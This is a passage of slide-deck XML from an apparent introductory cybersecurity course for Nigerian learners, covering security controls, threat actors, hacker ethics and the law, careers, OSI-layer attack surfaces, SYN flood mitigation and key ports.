                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  🔒 ENCRYPTION      │  #  HASHING          │  🔁 REDUNDANCY      │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  AES-256 (at rest)  │  SHA-256 / SHA-3     │  RAID, Clustering   │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  TLS 1.3 (transit)  │                      │  Geographic         │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│                     │  ✍  DIGITAL SIGS     │                     │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  👤 ACCESS CONTROL  │  RSA-PSS / ECDSA     │  ⚖  LOAD BALANCING │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  RBAC / DAC / MAC   │                      │  HAProxy, AWS ELB   │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  Least Privilege    │  ✓  CHECKSUMS        │  NGINX              │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│                     │  CRC32 / Adler-32    │                     │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  🔑 MFA             │                      │  🚨 DDoS MITIGATION │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  TOTP (Authenticator│  📋 VERSION CONTROL  │  Cloudflare         │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  YubiKey / Hardware │  Git + Signed Commits│  AWS Shield         │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  Biometrics         │                      │  Akamai             │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│                     │  🗄  WORM STORAGE    │                     │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  🏷  DATA CLASS.    │  S3 Object Lock      │  💾 BACKUPS         │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│  Public→Restricted  │  Immutable Logs      │  3-2-1 Rule         │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│                     │                      │  Air-gapped copies  │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│                     │                      │                     │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│                     │                      │  📋 DISASTER REC.   │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│                     │                      │  Hot/Warm/Cold Site │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>│                     │                      │  RTO · RPO · BCP    │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>└─────────────────────┴──────────────────────┴─────────────────────┘</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THREAT ACTORS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WHO IS ATTACKING?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[CYBERCRIMINAL]          [NATION-STATE]           [HACKTIVIST]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Financial gain           Espionage, sabotage       Political/ideological</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>BEC, ransomware          APT, infrastructure       DDoS, defacement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>card fraud               attacks                   data leaks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[INSIDER THREAT]         [SCRIPT KIDDIE]           [COMPETITOR]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Grudge, greed            Fame, curiosity            Corporate espionage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Data theft               Uses existing tools        IP theft</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>account abuse            Copies attacks             data exfiltration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>NIGERIAN CONTEXT:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SilverTerrier group — world-class BEC operators</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SIM swap fraud rings — organised criminal groups</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Growing nation-state targeting of Nigerian infrastructure</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HACKER ETHICS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THE THREE HATS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WHITE HAT              GREY HAT               BLACK HAT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>─────────────          ──────────             ──────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Authorised testing     No authorisation       Malicious</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Usually discloses      Criminal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Penetration tester     "I found a bug         Attacker</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Bug bounty hunter      and told them"         Data thief</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Security consultant                           Ransomware operator</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Legal ✓                Legal grey area ⚠      Illegal ✗</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>NIGERIA: Cybercrimes Act 2015</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Section 6: Unauthorised access → up to 3 years imprisonment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Section 14: Identity theft → up to 7 years</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Section 19: Computer fraud → up to 7 years</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WE TRAIN WHITE HATS ONLY.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Everything requires written authorisation. No exceptions.</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CYBERSECURITY CAREERS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CYBERSECURITY CAREER MAP — NIGERIA 2024/25</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SOC Analyst (Tier 1)      ₦150K–₦300K/month    Entry point</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Security Analyst           ₦300K–₦600K/month    +2 years</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Penetration Tester         ₦400K–₦900K/month    +CEH/OSCP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Incident Responder         ₦500K–₦1M/month      High demand now</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Security Engineer          ₦600K–₦1.5M/month    Technical expert</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CISO                       ₦1.5M–₦5M/month      Executive level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>🌍 REMOTE/INTERNATIONAL: $2,000–$8,000/month</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CERTIFICATIONS THAT OPEN DOORS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CompTIA Security+ → CySA+ → CEH → OSCP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Your MetaBridge blockchain certificate:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Verifiable by any employer, instantly, globally.</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BEGINNER</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2 OPENER: NETWORKING</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THE OSI MODEL — SECURITY LENS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OSI MODEL — 7 ATTACK SURFACES</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Layer 7  APPLICATION    HTTP, SMTP, DNS         SQL injection, XSS, phishing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Layer 6  PRESENTATION   Encryption, format      SSL stripping, weak ciphers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Layer 5  SESSION        Session management      Session hijacking, replay</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Layer 4  TRANSPORT      TCP/UDP, ports          SYN flood, port scanning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Layer 3  NETWORK        IP addressing           IP spoofing, routing attacks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Layer 2  DATA LINK      MAC, Ethernet, WiFi     ARP spoofing, MAC flooding</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Layer 1  PHYSICAL       Cables, wireless        Physical access, evil twin AP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>MEMORY AID: "All People Seem To Need Data Processing"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Most attacks happen at Layer 7 (Application)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Most defenders focus on Layer 3 (Network) only</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>The gap = where attackers thrive</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TCP HANDSHAKE &amp; SYN FLOOD</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TCP THREE-WAY HANDSHAKE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>NORMAL:                         ATTACK (SYN FLOOD):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Client → Server: SYN            Attacker → Server: SYN × 10,000</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Server → Client: SYN-ACK        Server → Attacker: SYN-ACK × 10,000</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Client → Server: ACK            Attacker: (never sends ACK)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Connection established!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Server holds 10,000 half-open connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Memory exhausted → Server crashes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1000">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>= DoS attack at Transport Layer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>MITIGATION:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  • SYN cookies — server doesn't commit resources until full handshake</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  • Rate limiting — block excessive SYN from single IP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>  • DDoS protection service (Cloudflare, AWS Shield)</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KEY PORTS — SECURITY RELEVANCE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PORTS EVERY SECURITY PROFESSIONAL MUST KNOW</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>PORT    PROTOCOL    SECURITY NOTE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>─────────────────────────────────────────────────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>21      FTP         🔴 Plaintext file transfer — avoid entirely</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>22      SSH         🟢 Encrypted remote access — monitor for brute force</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>23      TELNET      🔴 NEVER use — sends everything in plaintext</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
